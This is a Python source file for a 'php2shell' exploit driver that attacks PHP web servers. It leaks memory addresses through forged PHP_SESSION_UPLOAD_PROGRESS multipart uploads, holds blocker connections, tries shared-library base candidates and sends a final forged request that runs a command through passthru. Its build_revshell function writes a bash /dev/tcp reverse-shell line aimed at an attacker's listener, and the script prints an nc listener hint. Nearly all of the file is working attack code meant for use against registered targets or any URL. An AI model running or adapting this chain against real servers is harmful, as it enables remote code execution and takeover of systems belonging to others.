#!/usr/bin/env python3
"""php2shell chain driver (--step recon | chain).

recon:   pre-flight fingerprint (tool/stages/probe.py) + stock arm + leak
         probe + address derivation; machines stay unmodified, receipt only.
chain:   blocker-hold + per-DSO-candidate attempt loop (rearm + final forged
         multipart = the controlled copy stage, executed via the reconstructed
         COMPACT module tool/modules/compact-stock-tail.py).

Target registration and per-build binary profiles: tool/modules/profiles.py.

Not implemented (chain stage producer): producers from
tool/modules/producer.py are not wired into a CLI step yet.
Not implemented (chain stage targets): TARGETS["modphp"].

Entry points: ./tool/php2shell.py, ./tool/run, python -m tool
"""

import argparse
import hashlib
import importlib.util
import json
import re
import socket
import sys
import time
from pathlib import Path
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports

from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
from tool.stages import probe as probe_stage  # noqa: E402


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


# Conserved module alias: the former native-output-leak.py now lives at
# tool/modules/arm.py (multipart PHP_SESSION_UPLOAD_PROGRESS builders +
# HTTP framing + disclosure analyzer).
LEAK = load("tool_arm", HERE / "modules" / "arm.py")

# STOCK/COMPACT ship as separate author-provided files in tool/modules/.
STOCK = None
COMPACT = None


def load_helpers() -> None:
    global STOCK, COMPACT
    missing = [
        name
        for name in (
            "native-output-leak-stock-arm.py",
            "compact-stock-tail.py",
        )
        if not (HERE / "modules" / name).exists()
    ]
    if missing:
        raise FileNotFoundError(
            "missing helper module(s) in tool/modules/: " + ", ".join(missing)
        )
    STOCK = load("native_output_stock_arm", HERE / "modules" / "native-output-leak-stock-arm.py")
    COMPACT = load("compact_stock_tail", HERE / "modules" / "compact-stock-tail.py")


BINARY_PROFILES = profiles.BINARY_PROFILES

PROFILE = dict(BINARY_PROFILES["ubuntu85-1.3-compact"])

ID_LINE = re.compile(
    rb"(?m)^uid=[0-9]+\([A-Za-z0-9_.-]+\) "
    rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
)


def parse_url(value: str) -> tuple[str, int, str, str]:
    parsed = urlsplit(value)
    if parsed.scheme != "http" or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("URL must be an uncredentialed HTTP URL without a fragment")
    if not parsed.hostname:
        raise ValueError("URL has no host")
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else f"{parsed.hostname}:{port}"
    return parsed.hostname, port, path, host_header


def multipart_request(
    host_header: str,
    path: str,
    sid: bytes,
    boundary: bytes,
    body: bytes,
    keep_alive: bool,
) -> bytes:
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + b"Cookie: PHPSESSID=" + sid + b"\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def open_exchange(host: str, port: int, request: bytes, timeout: float):
    connection = socket.create_connection((host, port), timeout=timeout)
    connection.settimeout(timeout)
    stream = connection.makefile("rb", buffering=0)
    connection.sendall(request)
    return connection, stream, LEAK.read_response(stream)


def exchange(host: str, port: int, request: bytes, timeout: float):
    connection = None
    try:
        connection, stream, result = open_exchange(host, port, request, timeout)
        return result, None
    except (ConnectionError, OSError, TimeoutError, ValueError) as error:
        return (b"", b"", {}, 0), f"{type(error).__name__}: {error}"
    finally:
        if connection is not None:
            connection.close()


def record(output: Path, label: str, request: bytes, result, error: str | None = None) -> dict:
    response, body, headers, status = result
    artifacts = {
        f"{label}-request.bin": request,
        f"{label}-response.bin": response,
        f"{label}-body.bin": body,
    }
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
    item = {
        "status": status,
        "connection": headers.get("connection", ""),
        "body_bytes": len(body),
        "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
    }
    if error:
        item["error"] = error
    return item


def derive(body: bytes, submitted: list[bytes]) -> dict:
    disclosure = LEAK.analyze(body, submitted)
    if len(body) != 14 or not disclosure.get("candidate"):
        raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
    main = int(disclosure["main_chunk"], 16)
    target = main + PROFILE["target_offset"]
    stage = main + PROFILE["stage_offset"]
    candidates = [main - delta for delta in PROFILE["dso_deltas"]]
    return {
        "disclosure": disclosure,
        "main": f"0x{main:x}",
        "target": f"0x{target:x}",
        "stage": f"0x{stage:x}",
        "stage_delta": f"0x{stage - target:x}",
        "dso_candidates": [f"0x{candidate:x}" for candidate in candidates],
    }


def build_revshell(lhost: str, lport: int) -> str:
    try:
        addresses = {item[4][0] for item in socket.getaddrinfo(lhost, None)}
    except OSError:
        addresses = set()
    host = next(iter(addresses), lhost)
    # runs inside passthru() -> /bin/sh -c; exec keeps a single interactive bash
    return f"bash -c 'exec bash -i &>/dev/tcp/{host}/{lport}'"


def command_mode(command: str, lhost: str, lport: int) -> str:
    if command == "revshell":
        command = build_revshell(lhost, lport)
    return f"passthru-{command}"


def attempt(
    host: str,
    port: int,
    path: str,
    host_header: str,
    timeout: float,
    ordinal: int,
    output: Path,
    payload: str,
) -> dict:
    output.mkdir(parents=True, exist_ok=True)
    native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    native_arm_request = LEAK.request_bytes(
        host_header, path, native_arm_body, None, 23, False
    )
    native_arm_result, native_arm_error = exchange(
        host, port, native_arm_request, timeout
    )

    probe_body = LEAK.probe_body()
    probe_request = LEAK.request_bytes(host_header, path, probe_body, b"", 64, True)
    positive = None
    try:
        positive, positive_stream, probe_result = open_exchange(
            host, port, probe_request, timeout
        )
        address = derive(probe_result[1], [native_arm_request, probe_request])
        main = int(address["main"], 16)
        target = int(address["target"], 16)
        stage_delta = int(address["stage_delta"], 16)
        dso_base = main - PROFILE["dso_deltas"][ordinal]

        rearm_body = COMPACT.arm_body(False, COMPACT.ARM_FILENAME_LENGTH, 149)
        rearm_request = multipart_request(
            host_header,
            path,
            f"rearm{ordinal}a".encode("ascii"),
            COMPACT.BOUNDARY,
            rearm_body,
            False,
        )
        positive.sendall(rearm_request)
        rearm_result = LEAK.read_response(positive_stream)
    finally:
        if positive is not None:
            positive.close()

    final_body = COMPACT.probe_body(
        100,
        39,
        39,
        11,
        True,
        2,
        8000,
        6000,
        False,
        True,
        target,
        dso_base,
        stage_delta,
        1,
        payload,
    )
    final_request = multipart_request(
        host_header,
        path,
        f"rearm{ordinal}b".encode("ascii"),
        COMPACT.BOUNDARY,
        final_body,
        False,
    )
    final_result, final_error = exchange(host, port, final_request, timeout)
    match = ID_LINE.search(final_result[1])

    records = {
        "native_arm": record(
            output, "native-arm", native_arm_request, native_arm_result, native_arm_error
        ),
        "probe": record(output, "probe", probe_request, probe_result),
        "rearm": record(output, "rearm", rearm_request, rearm_result),
        "final": record(output, "final", final_request, final_result, final_error),
    }
    result = {
        "ordinal": ordinal,
        "dso_delta": f"0x{PROFILE['dso_deltas'][ordinal]:x}",
        "selected_dso": f"0x{dso_base:x}",
        "addresses": address,
        "records": records,
        "id_line": match.group(0).decode("ascii") if match else None,
        "success": bool(match),
        "final_parts": 116,
    }
    rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return result


def run_recon(
    host: str,
    port: int,
    path: str,
    host_header: str,
    timeout: float,
    target_label: str,
    output: Path,
) -> dict:
    """recon step: pre-flight fingerprint, stock arm, leak probe, addresses."""
    load_helpers()
    output.mkdir(parents=True, exist_ok=True)
    summary: dict = {
        "step": "recon",
        "target": target_label,
        "host": host,
        "port": port,
        "path": path,
    }
    summary["preflight"] = probe_stage.fingerprint(host, port, host_header, path, timeout)
    if not summary["preflight"].get("alive"):
        summary["notes"] = "target not alive on this endpoint; arm/probe skipped"
        return summary

    native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    native_arm_request = LEAK.request_bytes(host_header, path, native_arm_body, None, 23, False)
    native_arm_result, native_arm_error = exchange(host, port, native_arm_request, timeout)

    probe_request = LEAK.request_bytes(host_header, path, LEAK.probe_body(), b"", 64, True)
    probe_result, probe_error = exchange(host, port, probe_request, timeout)

    records: dict = {}

    def safe_record(label, request, result, error=None):
        if error is None:
            try:
                records[label] = record(output, label, request, result)
                return records[label]
            except (OSError, ValueError) as exc:
                error = f"{type(exc).__name__}: {exc}"
        records[label] = {"error": error}

    safe_record("native-arm", native_arm_request, native_arm_result, native_arm_error)
    safe_record("probe", probe_request, probe_result, probe_error)

    addresses = None
    if probe_error is None:
        try:
            addresses = derive(probe_result[1], [native_arm_request, probe_request])
        except ValueError as error:
            addresses = {"error": str(error)}
    summary["addresses"] = addresses
    summary["records"] = records
    summary["arm_exchange_error"] = native_arm_error
    summary["probe_exchange_error"] = probe_error
    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(
        description="php2shell chain driver: --step recon (read-only receipt) or "
        "--step chain (blocker-hold + rearm + forged staged multipart)"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="registered target name (tool/modules/profiles.py: wiki, wp) "
        "or an http:// URL for a one-off exchange (legacy usage)",
    )
    parser.add_argument("--url", default=None, help="explicit target URL override")
    parser.add_argument("--step", required=True, choices=("recon", "chain"))
    parser.add_argument(
        "--profile",
        default=None,
        choices=tuple(BINARY_PROFILES),
        help="per-build constants; defaults to the target's bound profile",
    )
    parser.add_argument("--command", default="id", help="chain command payload (default: id)")
    parser.add_argument("--lhost", default="127.0.0.1")
    parser.add_argument("--lport", default=4444, type=int)
    parser.add_argument(
        "--output",
        type=Path,
        default=None,
        help="receipt directory; default files/io/<target>-<step>-<UTC stamp>",
    )
    parser.add_argument("--settle-seconds", default=8.0, type=float)
    parser.add_argument("--recovery-seconds", default=2.0, type=float)
    parser.add_argument("--timeout", default=120.0, type=float)
    args = parser.parse_args()

    target_name = args.target
    url = args.url
    if target_name is not None and target_name.startswith(("http://", "https://")):
        # legacy: the URL was passed as --target
        url = target_name
        target_name = None
    if target_name is not None and not profiles.is_known_target(target_name):
        parser.error(
            "--target must be one of " + ", ".join(profiles.TARGETS) + " or an http:// URL"
        )
    if url is None:
        url = profiles.url_for(target_name) if target_name else None
    if url is None:
        parser.error(
            "no target URL: pass a registered --target (with an http endpoint) or --url"
        )

    profile_name = args.profile
    if profile_name is None:
        try:
            profile_name = profiles.profile_for(target_name, url_target=(target_name is None))
        except ValueError as error:
            parser.error(str(error))

    try:
        host, port, path, host_header = parse_url(url)
    except ValueError as error:
        parser.error(str(error))

    if PROFILE["name"] != profile_name:
        PROFILE.clear()
        PROFILE.update(BINARY_PROFILES[profile_name])

    if not 0 <= args.settle_seconds <= 15:
        parser.error("settle interval must be between 0 and 15 seconds")
    if not 0 <= args.recovery_seconds <= 15:
        parser.error("recovery interval must be between 0 and 15 seconds")
    if not 1 <= args.lport <= 65535:
        parser.error("lport must be between 1 and 65535")

    if args.output is None:
        stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
        args.output = HERE.parent / "files" / "io" / f"{target_name or 'adhoc'}-{args.step}-{stamp}"

    payload = None
    if args.step == "chain":
        payload = command_mode(args.command, args.lhost, args.lport)
        if args.command == "revshell":
            print(f"[i] payload command: {payload}")
            print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
        hold = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Connection: keep-alive\r\n"
            "X-Hold: "
        ).encode("ascii")

    if args.step == "recon":
        result = run_recon(host, port, path, host_header, args.timeout, target_name or url, args.output)
        summary = result
    else:
        blockers = []
        attempts = []
        try:
            for _ in range(PROFILE["blockers"]):
                connection = socket.create_connection((host, port), timeout=5)
                connection.settimeout(args.timeout)
                connection.sendall(hold)
                blockers.append(connection)
            time.sleep(args.settle_seconds)

            for ordinal in range(len(PROFILE["dso_deltas"])):
                try:
                    result = attempt(
                        host,
                        port,
                        path,
                        host_header,
                        args.timeout,
                        ordinal,
                        args.output / f"candidate-{ordinal}",
                        payload,
                    )
                except (ConnectionError, OSError, TimeoutError, ValueError) as error:
                    result = {
                        "ordinal": ordinal,
                        "success": False,
                        "error": f"{type(error).__name__}: {error}",
                    }
                attempts.append(result)
                if result.get("success"):
                    break
                time.sleep(args.recovery_seconds)
        finally:
            for connection in blockers:
                connection.close()

        success = next((item for item in attempts if item.get("success")), None)
        summary = {
            "step": "chain",
            "profile": PROFILE,
            "target": {"url": url, "host": host, "port": port, "path": path},
            "command": args.command,
            "lhost": args.lhost,
            "lport": args.lport,
            "payload": payload,
            "blockers_opened": len(blockers),
            "attempts": attempts,
            "success": bool(success),
            "id_line": success.get("id_line") if success else None,
            "successful_candidate": success.get("ordinal") if success else None,
        }
        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
        (args.output / "result.json").write_text(rendered)
        if success:
            print(success["id_line"])
        else:
            print("RCE proof failed")
        return 0 if success else 2

    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (args.output / "result.json").write_text(rendered)
    print(rendered, end="")
    # recon exit code: 0 = worker responded with a parseable HTTP exchange;
    # arm/probe field-level outcomes live in the receipt for human review.
    return 0 if summary.get("preflight", {}).get("alive") else 2


if __name__ == "__main__":
    raise SystemExit(main())
